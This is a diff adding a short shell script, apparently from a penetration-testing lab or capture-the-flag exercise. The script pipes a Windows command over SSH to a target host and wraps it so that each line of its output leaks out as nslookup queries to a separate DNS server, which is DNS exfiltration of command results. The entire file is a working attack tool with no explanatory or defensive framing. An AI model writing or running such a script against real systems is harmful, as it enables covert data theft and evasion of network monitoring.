@@ -1,0 +1,11 @@
+#!/bin/sh
+
+cmd=$1
+delim=$2
+dns="10.66.10.201"
+tgt="10.66.10.56"
+
+sendCmd="( nslookup START.${delim}. $dns & FOR /F \"delims=${delim} tokens=1*\" %a IN ('${cmd}') DO ( nslookup LINE. $dns & nslookup DATA.D%a.D%b. $dns) ) & nslookup END.${delim}. $dns"
+
+echo $sendCmd | ssh m0noc@$tgt > /dev/null 2>&1
+echo
